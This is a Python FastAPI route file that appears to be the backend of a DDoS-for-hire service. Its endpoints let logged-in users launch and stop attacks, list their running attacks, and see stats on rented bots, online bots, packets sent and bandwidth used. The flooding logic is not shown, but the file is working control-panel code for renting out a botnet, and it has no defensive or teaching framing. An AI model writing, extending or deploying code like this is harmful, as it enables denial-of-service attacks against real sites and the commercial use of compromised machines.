from fastapi import APIRouter, Depends, HTTPException
from uuid import UUID
from app.auth import get_current_user
from app.models.all_models import User
from app.schemas.all_schemas import AttackCreate, AttackOut
from app.services.attack_service import AttackService

router = APIRouter(prefix="/api/attacks", tags=["attacks"])

@router.post("/launch", response_model=AttackOut)
async def launch_attack(data: AttackCreate, current_user: User = Depends(get_current_user)):
    try:
        task = await AttackService.launch(current_user, data)
        return AttackOut.model_validate(task)
    except HTTPException:
        raise
    except ValueError as e:
        raise HTTPException(400, str(e))
    except Exception as e:
        raise HTTPException(500, str(e))

@router.post("/{task_id}/stop")
async def stop_attack(task_id: UUID, current_user: User = Depends(get_current_user)):
    await AttackService.stop(task_id, current_user)
    return {"status": "stopped", "task_id": str(task_id)}

@router.get("/mine")
async def my_attacks(current_user: User = Depends(get_current_user)):
    tasks = await AttackService.get_user_tasks(current_user.id)
    return [AttackOut.model_validate(t) for t in tasks]

@router.get("/active")
async def active_attacks(current_user: User = Depends(get_current_user)):
    if current_user.role == "admin":
        tasks = await AttackService.get_active_tasks()
    else:
        tasks = await AttackService.get_active_tasks(user_id=current_user.id)
    return [AttackOut.model_validate(t) for t in tasks]

@router.get("/stats/me")
async def my_stats(current_user: User = Depends(get_current_user)):
    """User-facing dashboard stats (no admin required)."""
    from app.database import async_session
    from app.models.all_models import Bot, AttackTask
    from sqlalchemy import select, func
    async with async_session() as s:
        my_bots = (await s.execute(
            select(func.count(Bot.id)).where(Bot.rented_by_user_id == current_user.id)
        )).scalar() or 0
        my_online = (await s.execute(
            select(func.count(Bot.id)).where(
                Bot.rented_by_user_id == current_user.id, Bot.status == "online"
            )
        )).scalar() or 0
        active = (await s.execute(
            select(func.count(AttackTask.id)).where(
                AttackTask.user_id == current_user.id, AttackTask.status == "running"
            )
        )).scalar() or 0
        pkts = (await s.execute(
            select(func.coalesce(func.sum(AttackTask.total_packets), 0)).where(
                AttackTask.user_id == current_user.id
            )
        )).scalar() or 0
        bytes_ = (await s.execute(
            select(func.coalesce(func.sum(AttackTask.total_bytes), 0)).where(
                AttackTask.user_id == current_user.id
            )
        )).scalar() or 0
    return {
        "my_bots": my_bots,
        "my_online_bots": my_online,
        "active_attacks": active,
        "total_packets": int(pkts),
        "total_bandwidth_gb": round(float(bytes_) / 1e9, 2),
        "role": current_user.role,
        "username": current_user.username,
    }